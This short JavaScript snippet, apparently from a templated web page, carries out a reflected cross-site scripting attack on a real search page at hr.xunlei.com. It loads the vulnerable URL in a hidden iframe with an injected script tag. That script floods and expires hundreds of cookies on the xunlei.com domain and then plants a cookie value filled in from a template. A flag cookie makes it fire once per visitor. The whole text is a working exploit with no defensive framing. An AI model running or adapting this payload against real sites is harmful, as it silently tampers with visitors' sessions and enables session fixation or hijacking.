function xss() {
  var script = 'for(var i=0;i<500;i++){document.cookie="loli"+i.toString()+"=1;domain=.xunlei.com";}for(var i=0;i<500;i++){document.cookie="loli"+i.toString()+"=0;domain=.xunlei.com;expires=Wed, 28 Dec 2011 12:46:19 GMT"}document.cookie="{{ cookie }}".replace(".vip","");console.log("done");';
  var iframe = document.createElement("iframe");
  iframe.setAttribute("style", "display: none;");
  iframe.src = "http://hr.xunlei.com/searchlist.html?contentkey='%3Cscript%3E"+encodeURI(script)+"%3C/script%3E";
  document.body.appendChild(iframe);
}
if (document.cookie.indexOf("xss=done") == -1) {
  xss();
  document.cookie = "xss=done";
}
